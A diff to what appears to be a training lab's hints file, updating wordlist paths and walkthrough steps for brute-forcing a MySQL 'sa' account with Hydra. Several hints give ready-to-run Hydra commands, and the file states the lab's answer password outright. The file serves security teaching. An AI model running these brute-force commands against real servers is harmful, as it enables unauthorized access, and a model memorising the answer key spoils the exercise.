@@ -165,20 +165,15 @@ hints:
 
       ### Choosing a Wordlist
 
-      Kali Linux includes several useful wordlists:
+      The RangeBox desktop ships a small SecLists password subset:
 
       | Wordlist Path                                    | Size    | Purpose          |
       |--------------------------------------------------|---------|------------------|
-      | `/usr/share/wordlists/rockyou.txt`               | 14M     | General passwords|
-      | `/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt` | Small | Top 100 |
-      | `/usr/share/seclists/Passwords/Common-Credentials/best1050.txt` | Small | Common 1050 |
-      | `/usr/share/wordlists/fasttrack.txt`             | Small   | Quick brute force|
+      | `/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100.txt` | Small | Top 100 |
+      | `/usr/share/seclists/Passwords/Common-Credentials/probable-v2_top-1575.txt` | Small | Common 1,575 |
 
-      **Note:** The `rockyou.txt` file may need to be decompressed first:
-
-      ```bash
-      sudo gunzip /usr/share/wordlists/rockyou.txt.gz
-      ```
+      Larger lists (such as `rockyou.txt`) are not baked into the image. Add
+      them under your own policy, or build a short targeted list for this lab.
 
       ### Important Considerations
 
@@ -193,8 +188,7 @@ hints:
       ### The Target Password
 
       The `sa` account in this lab uses a weak, commonly-used password.
-      It will be found in most standard wordlists including `rockyou.txt`
-      and `fasttrack.txt`. The password is: `qwerty`
+      It is in both shipped wordlists. The password is: `qwerty`
 
       This is one of the top 10 most commonly used passwords worldwide.
 
@@ -222,20 +216,13 @@ hints:
 
       ### Step 3: Prepare Your Wordlist
 
-      Check that a suitable wordlist exists:
+      Check that the shipped wordlist exists:
 
       ```bash
-      # Check for rockyou
-      ls -la /usr/share/wordlists/rockyou.txt
-
-      # If compressed, decompress it
-      sudo gunzip /usr/share/wordlists/rockyou.txt.gz
-
-      # Or use fasttrack for a quicker attack
-      ls -la /usr/share/wordlists/fasttrack.txt
+      ls -la /usr/share/seclists/Passwords/Common-Credentials/
       ```
 
-      If no wordlists are available, create a small one with common
+      If you want a different list, create a small one with common
       passwords:
 
       ```bash
@@ -258,7 +245,7 @@ hints:
       Run the brute force attack:
 
       ```bash
-      hydra -l sa -P /usr/share/wordlists/rockyou.txt mysql://<target> -t 4 -f -V
+      hydra -l sa -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100.txt mysql://<target> -t 4 -f -V
       ```
 
       ### Step 5: Verify Discovered Credentials
@@ -292,16 +279,16 @@ hints:
       sudo apt install -y hydra default-mysql-client
       ```
 
-      ### Run Hydra with rockyou.txt
+      ### Run Hydra with the shipped top-100 list
 
       ```bash
-      hydra -l sa -P /usr/share/wordlists/rockyou.txt mysql://<target> -t 4 -f
+      hydra -l sa -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100.txt mysql://<target> -t 4 -f
       ```
 
-      ### Run Hydra with fasttrack.txt (Faster)
+      ### Run Hydra with the shipped 1,575-entry list (Faster)
 
       ```bash
-      hydra -l sa -P /usr/share/wordlists/fasttrack.txt mysql://<target> -t 4 -f
+      hydra -l sa -P /usr/share/seclists/Passwords/Common-Credentials/probable-v2_top-1575.txt mysql://<target> -t 4 -f
       ```
 
       ### Run Hydra with Custom Wordlist
@@ -346,7 +333,7 @@ hints:
 
       If Hydra runs but does not find the password:
       - Make sure your wordlist contains common passwords
-      - The password `qwerty` should be in any standard wordlist
+      - The password `qwerty` is in both shipped SecLists wordlists
       - Try the custom wordlist above
 
   - id: 6
@@ -357,7 +344,7 @@ hints:
       ### Step 1: Run the Brute Force Attack
 
       ```bash
-      hydra -l sa -P /usr/share/wordlists/rockyou.txt mysql://<target> -t 4 -f
+      hydra -l sa -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100.txt mysql://<target> -t 4 -f
       ```
 
       **Expected Output:**
@@ -405,13 +392,13 @@ hints:
       +---------------------------------------------------+
       ```
 
-      ### Alternative: Using fasttrack.txt (Faster)
+      ### Alternative: Using the shipped 1,575-entry list (Faster)
 
       ```bash
-      hydra -l sa -P /usr/share/wordlists/fasttrack.txt mysql://<target> -t 4 -f
+      hydra -l sa -P /usr/share/seclists/Passwords/Common-Credentials/probable-v2_top-1575.txt mysql://<target> -t 4 -f
       ```
 
-      This completes in seconds since `fasttrack.txt` is much smaller
+      This completes in seconds since `probable-v2_top-1575.txt` is much smaller
       and `qwerty` is near the top of most wordlists.
 
       ### Key Takeaways
